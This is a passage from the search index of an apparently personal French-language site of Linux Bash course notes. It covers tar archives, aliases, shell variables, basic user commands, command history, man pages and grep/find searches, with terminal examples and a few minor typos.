*.txt\nuser30@deb:~$\n</code></pre> <pre><code>user30@deb:~$ tar -cjvf archive.tar.bz2 Edition *.txt\nEdition\ncontacts.txt\nedition1.txt\nerr.txt\nFait.txt\n</code></pre>"},{"location":"Linux/Bash_avance/#ajouter-des-fichiers-a-une-archive-existante","title":"Ajouter des fichiers \u00e0 une archive existante","text":"<p>Utilisation de l'option <code>[u]</code> update.  </p> <p>Pour l'utilisation de l'option il faut ce rendre a la racine via <code>cd /</code> afin d'\u00e9viter les soucis dus \u00e0 la suppression du <code>/</code>, repr\u00e9sentant la racine, par la commande <code>tar</code>.</p> <p>Ajout de fichiers .txt dans une archive existante</p> <pre><code>user30@deb:~$ cd / # permet de ce rendre a la racine\nuser30@deb:~$ tar uvf archive.tar home/user30/*.txt\nuser30@deb:~$\n</code></pre>"},{"location":"Linux/Bash_avance/#lister-le-contenu-dune-archive","title":"Lister le contenu d'une archive","text":"Lister basiquementLister avec plus d'information <pre><code>user30@deb:~$ tar -tf archive.tar.gz\nEdition\ncontacts.txt\nedition1.txt\nerr.txt\nFait.txt\n</code></pre> <pre><code>user30@deb:~$ tar -tvf archive.tar.gz\n-rw-------  user30/user30    586  2020-04-16  17:26  Edition\n-rw-r--r--  user30/user30     71  2020-07-21  14:16  contacts.txt\nlrwxrwxrwx  user30/user30      0  2020-07-20  14:55  edition1.txt\nEdition\n-rw-r--r--  user30/user30     86  2020-09-08  15:06  err.txt\n-rw-r--r--  user30/user30     39  2020-08-13  17:31  Fait.txt\n</code></pre>"},{"location":"Linux/Bash_avance/#gestion-des-alias","title":"Gestion des alias","text":"<p>Les alias sont des raccourcis, permettant de simplifier des commandes complexe. Permettant \u00e9galement d'avoir des s\u00e9quences plus courtes, voir plus s\u00e9curis\u00e9.  </p> <p>Dans le cas pr\u00e9sent l'alias <code>ll</code> remplacera l'appel \u00e0 <code>ls -l</code> </p> <pre><code>user30@deb:~$ aliass ll=\"ls -l\"\nuser30@deb:~$ ll\n-rw------- user30/user30    586  2020-04-16  17:26  Edition\n-rw-r--r-- user30/user30     71  2020-07-21  14:16  contacts.txt\nlrwxrwxrwx user30/user30      0  2020-07-20  14:55  edition1.txt -&gt; Edition\n-rw-r--r-- user30/user30     86  2020-09-08  15:06  err.txt\n-rw-r--r-- user30/user30     39  2020-08-13  17:31  Fait.txt\n</code></pre> <p>Dans ce cas alias <code>rm</code> fait appel a <code>rm -i</code>, permet de forcer la commande avec l'option <code>-i</code> permettant l'int\u00e9ractivit\u00e9 avec l'utilisateur  </p> <pre><code>user30@deb:~$ alias rm=\"rm -i\"\nuser30@deb:~$\n</code></pre> <p>La commande <code>alias</code> permet de lister les alias de la session  </p> <pre><code>user30@deb:~$ alias\nalias grep='grep --color=auto'\nalias ipa='ip address show dev ens33 |grep '\\\"inet '\\\"'\nalias ll='ls -l'\nalias ls='ls --color=auto'\nalias rm='rm -i'\nuser30@deb:~$\n</code></pre> <p>Les alias cr\u00e9e durant une session seront effac\u00e9 a la fermeture de celle-ci. Pour pouvoir les conserver il faudra les enregistrer dans un fichier de parametre. Le fichier en question est <code>.bashrc</code> Il y a possibilit\u00e9 de commenter ou decommenter un alias deja cr\u00e9e via <code>#</code> </p> <pre><code>user30@deb:~$ vim ~/.bashrc\n`[...]`\n# some more ls aliases\nalias ll='ls -l'\n#alias la='ls -A'\n#alias l='ls -CF'\n`[...]`\n### Mes alias ###\nalias rm=\"rm -i\"\nalias ipa=\"ip address show dev ens33 |grep 'inet '\"\nuser30@deb:~$ . .bashrc\n</code></pre> <p>Les param\u00e8tres enregistr\u00e9 dans le fichier ne sont pas directement appliqu\u00e9 a leurs cr\u00e9ations, il faudra relancer une session ou relancer le fichier <code>.bashrc</code> via <code>. . bashrc</code> <code>bashrc</code> n'est pas le seul fichier de personnalisation du shell, utlisation \u00e9galement de .bash_profil ou un .profil  </p> <p>Commande <code>unalias</code> Permet de supprimer un alias cr\u00e9e  </p> avant suppresionapres Suppression <pre><code>user30@deb:~$ alias\nalias grep='grep --color=auto'\nalias ipa='ip address show dev ens33 |grep '\\\"inet '\\\"'\nalias ll='ls -l'\nalias ls='ls --color=auto'\nalias rm='rm -i' # la ligne supprim\u00e9\nuser30@deb:~$\n</code></pre> <pre><code>user30@deb:~$ unalias rm\nuser30@deb:~$ alias\nalias grep='grep --color=auto'\nalias ipa='ip address show dev ens33 |grep '\\\"inet '\\\"'\nalias ll='ls -l'\nalias ls='ls --color=auto'\n</code></pre>"},{"location":"Linux/Bash_avance/#plus-loin-avec-les-variables","title":"plus loin avec les variables","text":"<p>Chaque variable porte un nom Ce nom permet de r\u00e9cup\u00e9rer, modifier, le contenu de cette m\u00e9moire La donn\u00e9e n'existe que dans la m\u00e9moire vive du syst\u00e8me     Si le syst\u00e8me s'eteint la variable disparait! Pour lire une variable, on accole un caract\u00e8re <code>$</code> avant le nom de la variable  </p> <p>Cr\u00e9ation de la variable <code>var</code> puis son appel  </p> <pre><code>var=\"Ceci est le contenu de ma variable\"\necho var\nCeci est le contenu de ma variable\n</code></pre> <p>Cr\u00e9ation d'une variable d'une variable locale </p> <p>Une variable locale ne sera utilisable que sur le terminal l'ayant cr\u00e9e. l'export vers une variable d'environnement la rendra utlisable sur tous les autres shell.  </p> variable localeExport en variable d'environnement <pre><code>user30@deb:~$ prenom=Romain\nuser30@deb:~$ echo $prenom\nRomain\n</code></pre> <pre><code>user30@deb:~$ export prenom\nuser30@deb:~$ bash\nuser30@deb:~$ echo $prenom\nRomain\n</code></pre> <p>Pour creer une variable d'environnement sans passer par une variable locale il faut passer par la commande <code>export</code> puis le nom de notre variable et son contenu  </p> <pre><code>user30@deb:~$ export departement=\"Comptabilit\u00e9\"\nuser30@deb:~$ bash\nuser30@deb:~$ echo $departement\nuser30@deb:~$ Comptabilit\u00e9\n</code></pre> <p>D\u00e9truire une variable utilisation de la commande <code>unset</code> suivi du nom de la variable</p> <pre><code>user30@deb:~$ unset departement\nuser30@deb:~$ echo departement\n\nuser30@deb:~$\n</code></pre> <p>il est possible de cr\u00e9er une variable a partir d'une commande, afin \"d'automatiser\" certaine commande et les rendres plus facile \u00e0 l'utilisation</p> <pre><code>user30@deb:~$ heure=$(date +%Hh%M)\nuser30@deb:~$ echo $heure\n11h35\n</code></pre> <p>Les variables d'environnement syst\u00e8mes sont saisies en majuscule  </p> <p>La variable <code>$ PATH</code> Si un utilisateur cherche \u00e0 executer une commande, qui n'est pas interne au shell, <code>PATH</code> vas chercher les fichiers correspondant a cette commande dans les repertoires pr\u00e9sent dasn la variable $PATH  </p> <pre><code>user30@deb:~$ echo $PATH\n/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\n</code></pre> <p>La commande <code>which</code> permet de lister le chemin de la commande taper en option de cette commande.  </p> <pre><code>user30@deb:~$ which ls\n/usr/bin/ls\n</code></pre> <pre><code>graph LR\n  A\n</code></pre> <pre><code>graph LR\n  A[clavier] --&gt;|stdout| B[pipe];\n  B --&gt;|stdin| C[tee];\n  C --&gt; D[\u00c9cran];\n  C --&gt; E[fichier.txt];\n</code></pre>"},{"location":"Linux/Bash_introduction/","title":"Shell Bash","text":""},{"location":"Linux/Bash_introduction/#decouverte-du-shell-bash","title":"D\u00e9couverte du Shell Bash","text":""},{"location":"Linux/Bash_introduction/#decouverte-du-shell-linux","title":"D\u00e9couverte du shell Linux","text":"<p>Le shell est l\u2019interface par laquelle l\u2019utilisateur va interagir avec le syst\u00e8me d\u2019exploitation et les programmes disponibles. Le shell est un interpr\u00e9teur de commandes. On parle \u00e9galement de CLI (Command Line Interface).</p> <p>Ligne de commande shell</p> <pre><code>user30@deb:~$ echo \"Bonjour le monde\"  \nBonjour le monde  \n</code></pre> <p>Un shell traite les informations sous forme de flux. Par d\u00e9faut le shell va lire une commande \u00e0 partir du flux d\u2019entr\u00e9e, une saisie au clavier, ce flux va ce nommer <code>stdin (0)</code>(Standard Input) le syst\u00e8me vas traiter la commande et restituer le r\u00e9sultat normal sur la sortie standard <code>stdout (1)</code>(Standard Output). un second flux sera disponible en sortie, celui-ci traite des \u00e9ventuelles erreurs retourn\u00e9es par une commande, il se nomme <code>stderr (2)</code></p> Ligne de commande shell commande shellstdinstdout <pre><code>user30@deb:~$ echo \"Bonjour le monde\"\nBonjour le monde\n</code></pre> <pre><code>user30@deb:~$ echo \"Bonjour le monde\"\n</code></pre> <pre><code>Bonjour le monde\n</code></pre> ligne de commande shell avec erreur stdin (0)stderr (2) <pre><code>user30@deb:~$ cat Bonjour\n</code></pre> <pre><code>cat: Bonjour: Aucun fichier ou dossier de ce type\n</code></pre> <p>Dans le monde UNIX/Linux il existe diff\u00e9rent shell en voici quelques-uns (liste non exhaustive)</p> <ul> <li>Bourne Shell\u00a0: sh</li> <li>\u00e9crit par Steve Bourne</li> <li>Apparait dans Unix v7</li> <li>C Shell\u00a0: csh/tcsh</li> <li>\u00c9crit par Bill Joy</li> <li>Inspir\u00e9 du langage C</li> <li>KornShell\u00a0: ksh</li> <li>\u00c9crit par David Korn</li> <li>Compatible Bourne Shell, il reprend des \u00e9l\u00e9ments du C Shell</li> </ul> <p>Le Shell principal de Linux est le Bash, (Bo(u)rn(e) Again Shell)\u00a0: bash Shell principal des distributions GNU/Linux R\u00e9\u00e9criture de Bourne par Brian Fox au sein du projet GNU Impl\u00e9mentations libres de Bourne Shell Quelques am\u00e9liorations de bas par rapport \u00e0 Bourne</p> <ul> <li>Historique de commandes</li> <li>Autocompl\u00e9tion</li> <li>Alias de commande</li> </ul> <p>L\u2019utilisation de la CLI impose le respect de certaine r\u00e8gles, sans celle-ci il ne sera pas possible d\u2019utiliser le correctement le syst\u00e8me, nous aurons des messages d\u2019erreur sans cesse.</p> <p>Un shell Linux est sensible \u00e0 la casse</p> CorrectErreur <pre><code>user30@deb~$ echo \"bonjour le monde\"  \nBonjour le monde\n</code></pre> <pre><code>user30@deb~$ Echo \"bonjour le monde\"  \n-bash: Echo : commande introuvable\n</code></pre> <p>La commande doit toujours \u00eatre situ\u00e9e en premier dans l\u2019instruction apr\u00e8s le prompt La commande peut \u00eatre suivie par des options, puis des arguments, le tout s\u00e9par\u00e9 par des espaces. Les options sont en g\u00e9n\u00e9ral pr\u00e9c\u00e9d\u00e9 du signe <code>- ou +</code>elle peuvent aussi ne comporter aucun signe, elles peuvent \u00eatre s\u00e9par\u00e9es par des espaces ou regroup\u00e9es ensemble lorsqu\u2019il s\u2019agit d\u2019option simple. Les arguments sont les \u00e9l\u00e9ments utiles de la commande, \u00e0 savoir la donn\u00e9e que l\u2019on doit chercher \u00e0 traiter.  </p> Example de ShellPromptCommandeOptionsArgumentsR\u00e9sultat de la commande <pre><code>user30@LinuxUtil:~$ ls -l /home/user30  \ntotal 8  \n-rw-r--r-- 1 user30 36 juin 26 12:08 aFaire.txt  \n-rw------- 1 user30 586 avril 16 17:26 Edition  \n</code></pre> <pre><code>user30@LinuxUtil:~$\n</code></pre> <pre><code>ls\n</code></pre> <p><pre><code>-l\n</code></pre> indique une r\u00e9ponse longue</p> <pre><code>/home/user30\n</code></pre> <p>total 8 = signifie que 8 fichiers on \u00e9t\u00e9 trouv\u00e9 dans notre cas seul 2 sont affich\u00e9s</p> <p>Quelques exemples de commandes  </p> <p><code>who</code> Commande simple sans argument <code>ls /etc</code> Commande avec un argument <code>head -n 5 /etc/pam.conf</code> Commande avec une option et un argument <code>cp /tmp/fic1 $HOME</code> Commande avec 2\u00a0arguments <code>tar xzvf archive.tar.gz</code> Commande avec quatre options (sans signe + ou -) et un argument d\u2019option  </p>"},{"location":"Linux/Bash_introduction/#compte-root","title":"Compte \"Root\"","text":"<p>Sous Linux et Unix, le compte root est le compte du super administrateur L\u2019invite de commande root utilise le caract\u00e8re <code>#</code>(permet de diff\u00e9rencier une session super administrateur d\u2019une session simple utilisateur) Un administrateur utilisera son compte habituel pour les op\u00e9rations courantes puis effectuera ponctuellement une \u00e9l\u00e9vation de privil\u00e8ges selon les besoins. Pour des raisons de s\u00e9curit\u00e9, il est fortement d\u00e9conseill\u00e9 de se connecter en root. Sur les distributions Debian la connexion en root est nativement interdite. Il faudra se connecter avec un compte utilisateur standard, disposant des droits suffisant, puis faire une \u00e9l\u00e9vation de privil\u00e8ges en tant que root</p>"},{"location":"Linux/Bash_introduction/#premieres-commandes","title":"Premi\u00e8res commandes","text":"<p>La syntaxe des commandes est repr\u00e9sent\u00e9e ainsi\u00a0:  </p> <pre><code>commande [options] &lt;Argument&gt;\n</code></pre> <p>Rappel</p> <p>l'espace est un s\u00e9parateur d'expressions entre la commande, les options et les arguments.  </p>"},{"location":"Linux/Bash_introduction/#logname","title":"<code>logname</code>","text":"<pre><code>user12@srv-formateur:~$ logname  \nuser12\n</code></pre>"},{"location":"Linux/Bash_introduction/#id","title":"<code>id</code>","text":"<p><pre><code>user12@srv-formateur:~$ id  \nuid=1182(user12) gid=1210(grp4) groupes=1210(grp4)  \n</code></pre> uid\u00a0: identifiant unique gid\u00a0: identifiant du groupe principal de l\u2019utilisateur</p> <p><pre><code>user12@srv-formateur:~$ id -u user11  \n1181  \n</code></pre> Permet de r\u00e9cup\u00e9rer des informations sur un autre utilisateur l\u2019option <code>-u</code>permet de ne r\u00e9cup\u00e9rer que l\u2019uid de l\u2019utilisateur et non c\u2019est information compl\u00e8te.  </p>"},{"location":"Linux/Bash_introduction/#who","title":"<code>who</code>","text":"<p>Affiche les utilisateurs connect\u00e9s au syst\u00e8me.</p> <pre><code>user12@srv-formateur:~$ who\nuser03   pts/0        2023-07-03 16:54 (172.25.128.117)\neni      pts/1        2023-07-03 17:27 (172.25.128.89)\nuser04   pts/2        2023-07-03 16:53 (172.25.128.41)\nuser12   pts/3        2023-07-03 18:16 (172.25.128.2)\nuser15   pts/4        2023-07-03 17:36 (172.25.128.57)\nuser15   pts/5        2023-07-03 17:37 (172.25.128.137)\nuser03   pts/9        2023-07-03 16:55 (172.25.128.117)\n</code></pre> <p>affiche\u00a0:  </p> <ul> <li>l\u2019utilisateur, le terminal, la date et l\u2019heure de la connexion</li> </ul> <p>options disponibles [-H, -q, -u] (liste non exhaustive)</p> <ul> <li>-H\u00a0: Heading n\u2019affiche que les en-t\u00eate de colonne</li> </ul> <pre><code>user12@srv-formateur:~$ who -H\nNOM      LIGNE        HEURE            COMMENTAIRE\nuser03   pts/0        2023-07-03 16:54 (172.25.128.117)\neni      pts/1        2023-07-03 17:27 (172.25.128.89)\nuser04   pts/2        2023-07-03 18:23 (172.25.128.41)\nuser12   pts/3        2023-07-03 18:16 (172.25.128.2)\nuser15   pts/4        2023-07-03 17:36 (172.25.128.57)\nuser15   pts/5        2023-07-03 17:37 (172.25.128.137)\nuser03   pts/9        2023-07-03 16:55 (172.25.128.117)\n</code></pre> <ul> <li>-q\u00a0: uniquement les connexions actives</li> </ul> <pre><code>user12@srv-formateur:~$ who -q\nuser03 eni user04 user12 user15 user15 user03\nnombre d'utilisateurs : 7\n</code></pre> <ul> <li>-u\u00a0: affiche des informations compl\u00e9mentaires (jumel\u00e9 \u00e0 l\u2019option -H pour les en-t\u00eates)</li> </ul> <pre><code>user12@srv-formateur:~$ who -u -H\nNOM      LIGNE        HEURE                   PID COMMENTAIRE\nuser03   pts/0        2023-07-03 16:54 01:31        4006 (172.25.128.117)\neni      pts/1        2023-07-03 17:27 00:05        4503 (172.25.128.89)\nuser04   pts/2        2023-07-03 18:23 00:01        5242 (172.25.128.41)\nuser12   pts/3        2023-07-03 18:16   .          5149 (172.25.128.2)\nuser15   pts/4        2023-07-03 17:36 00:03        4599 (172.25.128.57)\nuser15   pts/5        2023-07-03 17:37 00:49        4634 (172.25.128.137)\nuser03   pts/9        2023-07-03 16:55 01:30        4074 (172.25.128.117)\n</code></pre> <p><code>who am i</code> donne des informations sur l\u2019utilisateur de la session courante uniquement  </p> <pre><code>user12@srv-formateur:~$ who am i\nuser12   pts/3        2023-07-03 18:16 (172.25.128.2)\n</code></pre>"},{"location":"Linux/Bash_introduction/#passwd-options","title":"<code>passwd [options]</code>","text":"<p>Permets de modifier le mot de passe utilisateur Si une erreur est effectu\u00e9e durant le changement le syst\u00e8me le pr\u00e9cisera et l\u2019ancien mdp ne sera pas chang\u00e9  </p> <pre><code>user12@srv-formateur:~$ passwd\nChangement du mot de passe pour user12.\nCurrent password:\nNouveau mot de passe :\nRetapez le nouveau mot de passe :\npasswd: password updated successfully\n</code></pre> <p><code>passwd -S</code> Affiche les informations sur le mot de passe actuel</p> <pre><code>user12@srv-formateur:~$ passwd -S\nuser12 P 07/03/2023 0 99999 7 -1\n</code></pre> <p>mot de passe</p> <p>Des exigences de complexit\u00e9 sur les mot de passe sont pr\u00e9sentes un mot de passe de base sur Linux devra: - 7 caract\u00e8res minimum - ne pas etre trop silimaire du pr\u00e9cedent mot de passe - ne doit pas etre bas\u00e9 sur un mot du dictionnaire  </p>"},{"location":"Linux/Bash_introduction/#date-options-format","title":"<code>date [options] &lt;+format&gt;</code>","text":"<p>Permets d\u2019afficher les informations de date et d\u2019heure du syst\u00e8me En contexte administrateur (root) <code>date</code>permet \u00e9galement de modifier la date et l\u2019heure du syst\u00e8me d\u2019exploitation</p> <pre><code>user12@srv-formateur:~$ date\nlundi 3 juillet 2023, 18:41:46 (UTC+0200)\n</code></pre> <p>Formater la sortie de <code>date</code></p> <pre><code>user12@srv-formateur:~$ date \"+%nBonjour, nous sommes le %A %d %B %Y.%nIl est %Hh%Mm\"\n\nBonjour, nous sommes le lundi 03 juillet 2023.\nIl est 18h43m\n</code></pre> <p>Attention</p> <p>Le signe <code>+</code> ne doit etre utilis\u00e9 qu'au d\u00e9but de la s\u00e9quence Si un autre + est utils\u00e9 il sera consider\u00e9 comme un caractere a ajouter a la sortie \u00e9cran </p> <p>Apr\u00e8s la commande <code>date</code>les <code>\"</code>la double quote permet d\u2019utiliser des espaces sans qu\u2019il soit pris pour des s\u00e9parateurs d\u2019expression. le <code>+</code> indique a la commande <code>date</code>qu\u2019elle va devoir interpr\u00e9ter ce qui suit en manipulant le format de sortie. Le caract\u00e8re <code>%n</code>indique un saut de ligne. Les <code>%A</code>, <code>%d</code>, <code>%B</code>, <code>%Y</code> permettent de r\u00e9cup\u00e9rer les informations<code>lundi</code>, <code>03</code>, <code>juillet</code>, <code>2023</code> Les <code>%H</code>, <code>%M</code> permettent de r\u00e9cup\u00e9rer les informations<code>Heure</code>, <code>Minutes</code> </p> <p>Quelques options de format de <code>date</code></p>"},{"location":"Linux/Bash_introduction/#cal-mois-annee","title":"<code>cal &lt;mois&gt; &lt;ann\u00e9e&gt;</code>","text":"<p>Permets d\u2019afficher le calendrier du mois et de l\u2019ann\u00e9e indiqu\u00e9e  </p> <pre><code>user12@srv-formateur:~$ cal\n    Juillet 2023\ndi lu ma me je ve sa\n                   1\n 2  3  4  5  6  7  8  \n 9 10 11 12 13 14 15\n16 17 18 19 20 21 22\n23 24 25 26 27 28 29\n30 31\n</code></pre> <pre><code>user12@srv-formateur:~$ cal 08 1987\n     Ao\u00fbt 1987\ndi lu ma me je ve sa\n                   1\n 2  3  4  5  6  7  8  \n 9 10 11 12 13 14 15\n16 17 18 19 20 21 22\n23 24 25 26 27 28 29\n30 31\n</code></pre>"},{"location":"Linux/Bash_introduction/#tty","title":"<code>tty</code>","text":"<p>Permets d\u2019afficher le nom du terminal utilis\u00e9 par la session actuelle  </p> <pre><code>user12@srv-formateur:~$ tty\n/dev/pts/4\n</code></pre> <p><code>pts</code> signifie pseudoterminal (uniquement en connexion distante)</p>"},{"location":"Linux/Bash_introduction/#pwd","title":"<code>pwd</code>","text":"<p>Permet d\u2019afficher \u00e0 quel endroit de l\u2019arborescence on se trouve (pwd\u00a0: print working directory)  </p> <p>Dans une configuration native Debian Linux, l\u2019information est directement pr\u00e9sente dans le prompt entre le\u00a0: et $ s\u2019affiche l\u2019emplacement actuel.  </p> <p>Dans un environnement CentOS est indiqu\u00e9 uniquement le nom du dossier courant et non le chemin complet de celui-ci  </p> <pre><code>user12@srv-formateur:~$ pwd\n/home/user12\n</code></pre>"},{"location":"Linux/Bash_introduction/#decouverte-des-variables","title":"D\u00e9couverte des variables","text":"<p>Chaque variable porte un nom Ce nom permet de r\u00e9cup\u00e9rer, modifier, le contenu de cette m\u00e9moire La donn\u00e9e n\u2019existe que dans la m\u00e9moire vive du syst\u00e8me  </p> <p>Pour lire une variable, on accole un caract\u00e8re <code>$</code>avant le nom de la variable.  </p> Commande <pre><code>var=\"Ceci est le contenu de ma variable\"\necho $var\nCeci est le contenu de ma variable\n</code></pre> Tips <p>var est le contenant comportant un contenu Dans notre cas \"Ceci est le contenu de ma variable\" var est le nom de la m\u00e9moire permettant d'acceder a cette donn\u00e9e et non la donn\u00e9e elle meme</p> <p>il existe de nombreuses variables dans les OS variables d\u2019environnement via la variable <code>env</code>permet d\u2019afficher les \u00e9l\u00e9ments suivant\u00a0:  </p> <ul> <li>SHELL = contiens le chemin vers le shell actuellement utilis\u00e9</li> <li>LOGNAME = contiens le nom d\u2019utilisateur</li> <li>HOME = contiens le chemin du r\u00e9pertoire personnel de l\u2019utilisateur</li> <li>etc.</li> </ul> <pre><code>user12@srv-formateur:~$ env\nSHELL=/bin/bash\nPWD=/home/user12\nLOGNAME=user12\nXDG_SESSION_TYPE=tty\nHOME=/home/user12\nLANG=fr_FR.UTF-8\n</code></pre> <p>la variable <code>set</code>permet la visualisation de toutes les variables d\u2019environnement et fonctions.  </p>"},{"location":"Linux/Bash_introduction/#simplifier-lutilisation","title":"Simplifier l\u2019utilisation","text":"<p>Le shell bash utilise un historique des commandes. Cette fonctionnalit\u00e9 apporte une grande efficacit\u00e9 \u00e0 l\u2019utilisateur. De mani\u00e8re basique on utilise les fl\u00e8ches haut et bas du clavier pour remonter ou redescendre dans ces commandes pr\u00e9c\u00e9dentes. <code>history</code> Permets d\u2019afficher le contenu de l\u2019historique de commandes.  </p> <p>Il est possible d\u2019augmenter encore son efficacit\u00e9 avec les raccourcis suivants\u00a0:</p> <ul> <li><code>!!</code>Rappeler la derni\u00e8re commande ex\u00e9cut\u00e9e</li> <li><code>!com</code>Rappeler la derni\u00e8re commande commen\u00e7ant par \"com\"</li> <li><code>!?fich</code>Rappeler la derni\u00e8re commande contenant la chaine \"fich\"</li> <li><code>!287</code>Rappeler la commande num\u00e9rot\u00e9e \"287\u2033 dans l\u2019historique  </li> </ul> <p>L\u2019historique de commande est m\u00e9moris\u00e9 dans le fichier <code>.bash_history</code>du r\u00e9pertoire personnel de l\u2019utilisateur  </p> <p>Bash utilis\u00e9 des variables d\u2019environnement pour g\u00e9rer l\u2019historique  </p> <ul> <li>HISTFILE</li> <li>HISTSIZE</li> </ul> <p>On peut les visualiser afin d\u2019obtenir des informations sur ces param\u00e8tres  </p>"},{"location":"Linux/Bash_introduction/#autocompletion","title":"Autocompl\u00e9tion","text":"<p>En utilisant la touche [tab] du clavier, le shell compl\u00e9tera de lui-m\u00eame notre saisie. Il est possible de compl\u00e9ter</p> <ul> <li>des chemins d\u2019acc\u00e8s</li> </ul> <pre><code>user30@deb:/$cd /e [tab]\nuser30@deb:/$cd /etc\n</code></pre> <ul> <li>des noms de commandes</li> </ul> <pre><code>user30@deb:~$ fir [tab]\nuser30@deb:~$ firefox\n</code></pre> <ul> <li>des noms de variables</li> </ul> <pre><code>user30@deb:/$ echo $LOG [tab]\nuser30@deb:/$ echo $LOGNAME\n</code></pre> <ul> <li>Si plusieurs choix sont disponibles, un double appui sur la touche [tab] va permettre de lister les r\u00e9sultats possibles</li> </ul> <pre><code>user30@deb:/$ ls /etc/h [tab] [tab]\nhdparm.conf host.conf hostname hosts hosts.allow hosts.deny\n</code></pre>"},{"location":"Linux/Bash_introduction/#aide","title":"Aide","text":"<p>Aide contextuelle des commandes</p> <ul> <li>aide plus ou moins succincte cod\u00e9e au sein m\u00eame de la commande.  </li> <li>Permets de trouver rapidement une information sur l\u2019utilisation g\u00e9n\u00e9rale de la commande ou sur les principales options.  </li> <li>La plupart des commandes utilisent l\u2019option longue <code>--help</code>pour son appel.</li> </ul> <pre><code>user30@deb:/$ pwd --help\n    pwd: pwd [-LP]\n    Affiche le nom du r\u00e9pertoire de travail courant.\n    Options :\n    -L affiche la valeur de $PWD s'il nomme le r\u00e9pertoire de travail courant\n</code></pre>"},{"location":"Linux/Bash_introduction/#man","title":"<code>man</code>","text":"<p><code>man</code> Est la principale commande d\u2019aide dans le monde Unix/Linux. <code>man</code> Donne acc\u00e8s au manuel du syst\u00e8me, des commandes, des fichiers de configuration. Pour obtenir l\u2019aide <code>man</code>: <code>man man</code></p> <p><pre><code>man passwd\nPASSWD(1)                                       Commandes utilisateur                                       PASSWD(1)\n\nNOM\n       passwd - Modifier le mot de passe d'un utilisateur\n\nSYNOPSIS\n       passwd [options] [LOGIN]\n\nDESCRIPTION\n       La commande passwd modifie les mots de passe des comptes d'utilisateurs. Un utilisateur normal ne peut changer\n       que son propre mot de passe, alors que le superutilisateur peut changer le mot de passe associ\u00e9 \u00e0 n'importe\n       quel compte. passwd modifie \u00e9galement les dates de fin de validit\u00e9 du compte ou du mot de passe associ\u00e9.\n</code></pre> Commande interne pour la section <code>man</code></p> <ul> <li><code>/mot</code>Rechercher \"mot\" dans la page</li> <li><code>n</code>Passer \u00e0 l\u2019occurrence suivante </li> <li><code>N</code>Passer \u00e0 l\u2019occurrence pr\u00e9c\u00e9dente</li> <li><code>h</code>Afficher l\u2019aide-interne de man</li> <li><code>q</code> Quitter man</li> </ul> <p>Utilisez-le <code>man</code>en Anglais LANG=C man passwd</p> <pre><code>user12@srv-formateur:~$ LANG=C man passwd\n</code></pre> <p>Bash poss\u00e8de \u00e9galement la commande<code>help</code>. Celle-ci apporte de l\u2019aide uniquement sur les commandes internes de shell.</p> <pre><code>user12@srv-formateur:~$ help\nGNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu)\nCes commandes de shell sont d\u00e9finies de mani\u00e8re interne. Saisissez  \n\u00ab help \u00bb pour voir cette liste.\nTapez \u00ab help nom \u00bb pour en savoir plus sur la fonction qui s'appelle \u00ab nom \u00bb.\nUtilisez \u00ab info bash \u00bb pour en savoir plus sur le shell en g\u00e9n\u00e9ral.\nUtilisez \u00ab man -k \u00bb ou \u00ab info \u00bb pour en savoir plus sur les commandes qui\nne font pas partie de cette liste.\n\nUne ast\u00e9risque (*) \u00e0 c\u00f4t\u00e9 d'un nom signifie que la commande est d\u00e9sactiv\u00e9e.\n</code></pre>"},{"location":"Linux/Bash_introduction/#effectuer-des-recherches","title":"Effectuer des recherches","text":""},{"location":"Linux/Bash_introduction/#commande-grep","title":"Commande <code>grep</code>","text":"<p><code>grep [-e -i -l -n -v] \"expr\" &lt;fichier1&gt; (&lt;fichier2&gt;)</code></p> <p>Permet de rechercher un motif dans fichier (ou dans le r\u00e9sultat d\u2019une commande si celle-ci est pr\u00e9c\u00e9d\u00e9e du \"pipe |\").  </p> <p>Option de <code>grep</code></p> option -eoption -ioption -loption -noption -voption -r ou -Roption -woption -c <p>Permet d'effectuer plusieurs recherche au sein d'un fichier Application d'un <code>OU</code> logique et non d'un <code>ET</code> logique</p> <p>Permet d'ignorer la casse lors des recherches</p> <p>Affiche les noms des fichiers ou le motif de recherche est pr\u00e9sent et non leurs contenu</p> <p>Affiche les num\u00e9ros de ligne comportant le motif</p> <p>Inverse le sens de la recherche, affiche les lignes qui ne correspondent pas</p> <p>Effectue une recherche r\u00e9cursive dans les r\u00e9pertoires</p> <p>Recherche des correspondances de mots entiers</p> <p>Affiche le nombre de lignes correspondantes au lieu des lignes elles-m\u00eames</p> commandes <code>grep</code> <pre><code>user30@deb:~$ grep -in \"dupont\" Edition\n13:Dupont Jean 111111\n14:Dupont Jean 111111\n15:Dupont Patrice 222222\n16:Dupont jojo 999999\n17:Dupont Pierre 222222\n</code></pre>"},{"location":"Linux/Bash_introduction/#filtrer-les-resultats-dune-commande","title":"Filtrer les r\u00e9sultats d\u2019une commande","text":"<p><code>&lt;command&gt; | grep [-e -i -l -n -v] \"expr\"</code></p> <p>Permets de filtrer le r\u00e9sultat d\u2019une pr\u00e9c\u00e9dente commande.  </p> filtrer le r\u00e9sultat de la commande ls commandeexplication <pre><code>user30@deb:~$ ls | grep -v \"[Tt]el\"\n-rw-r--r-- 1 user30 user30  113 juil. 21 11:04 liste.txt\n-rw-r--r-- 1 user30 user30   29 juil. 21 09:36 newcontacts\ndrwxr-xr-x 3 user30 user30 4096 juil. 21 14:38 perso\n-rw-r--r-- 1 user30 user30    0 juil. 21 17:27 toto\ndrwxr-xr-x 2 user30 user30 4096 ao\u00fbt  10 10:55 video\n</code></pre> <p>Dans cette commande on demande a <code>grep</code> de filtrer les r\u00e9sultat de <code>ls</code> afin d'exclure les fichiers [tel] commen\u00e7ant par un t ou un T</p>"},{"location":"Linux/Bash_introduction/#commande-find-recherche-avancee","title":"Commande <code>find</code> [recherche avanc\u00e9e]","text":"<p><code>find &lt;chemin&gt; [crit\u00e8re de recherches] ([action \u00e0 effectuer sur le r\u00e9sultat])</code></p> <p>Elle permet de sp\u00e9cifier diff\u00e9rents crit\u00e8res de recherche tels que le nom du fichier, la taille, la date de modification, etc., de par sa grande vari\u00e9t\u00e9 de crit\u00e8res de recherche coupl\u00e9e aux diff\u00e9rentes actions possibles sur le r\u00e9sultat.  </p> <p>find est nativement r\u00e9cursive, elle cherchera dans tous les sous-dossiers par d\u00e9faut Elle ne se limite pas au dossier courant elle cherchera \u00e9galement dans tous les dossiers enfants</p> <p>Quelques crit\u00e8res de recherche parmi les plus utilis\u00e9s  </p> crit\u00e8res Description -name \"ficnom\" Recherche en fonction du nom -user nom Recherche des fichiers par nom de l\u2019utilisateur propri\u00e9taire -group groupe Recherche des fichiers par nom du groupe 